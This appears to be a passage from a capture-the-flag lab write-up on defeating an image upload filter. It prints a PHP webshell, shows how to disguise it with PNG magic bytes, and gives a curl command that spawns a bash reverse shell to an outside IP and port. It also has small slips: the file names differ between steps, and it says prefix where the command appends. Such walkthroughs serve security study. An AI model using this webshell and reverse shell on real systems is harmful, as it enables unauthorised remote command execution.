The functionality of these files are easy, but the sanitization and validation are tight. We cannot upload file with size over 60000 and any file extension except for image file.

However, it doesn't check other stuff. So if we could falsify mime type, it's possible to upload php webshell.

Linux (and most systems) determine file type based on the file's content — especially the first few bytes, called the magic number — not the file extension. Therefore, if we append prefix of PNG file to a php file, our machine determine the php file as PNG file mistakenly. Let's do that.

└─$ nano shell.php.png
<?php
system($_REQUEST['cmd']);
?>

└─$ echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> mime_shell.php.png

Then, you can upload this file with http://target_ip/upload.php. After uploading, you can find the file in http://target_up/phptos.php. Find uploaded file name. Afterward, send request with reverse shell code.

└─$ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.51/4444 0>&1"' http://10.129.112.209/uploads/10_10_14_51.php.png Replace png file name with yours.
